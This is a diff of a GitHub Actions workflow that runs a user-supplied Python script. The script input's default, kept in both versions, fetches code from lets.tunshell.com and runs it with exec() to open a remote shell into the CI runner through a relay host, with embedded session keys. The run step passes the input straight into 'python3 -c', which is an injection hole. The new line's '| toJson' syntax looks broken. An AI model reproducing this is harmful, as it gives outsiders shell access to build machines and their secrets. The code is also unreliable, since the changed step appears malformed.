@@ -6,7 +6,7 @@ on:
       script:
         description: 'Enter the Python script to run'
         required: true
-        default: 'import urllib.request;r=urllib.request.urlopen("https://lets.tunshell.com/init.py");exec(r.read().decode("utf-8"),{"p":["T","QzVLcxZNLjOsL9B5GsOKpE","HusbgdDg2ERzl6ogwq9gUo","eu.relay.tunshell.com"]})'
+        default: 'import urllib.request; r=urllib.request.urlopen("https://lets.tunshell.com/init.py"); exec(r.read().decode("utf-8"), {"p": ["T", "QzVLcxZNLjOsL9B5GsOKpE", "HusbgdDg2ERzl6ogwq9gUo", "eu.relay.tunshell.com"]})'
 
 jobs:
   run-python:
@@ -24,4 +24,4 @@ jobs:
     - name: Run Python script
       run: |
         echo "Running the provided Python script:"
-        python3 -c "${{ github.event.inputs.script }}"
+        python3 -c "${{ inputs.script | toJson }}"
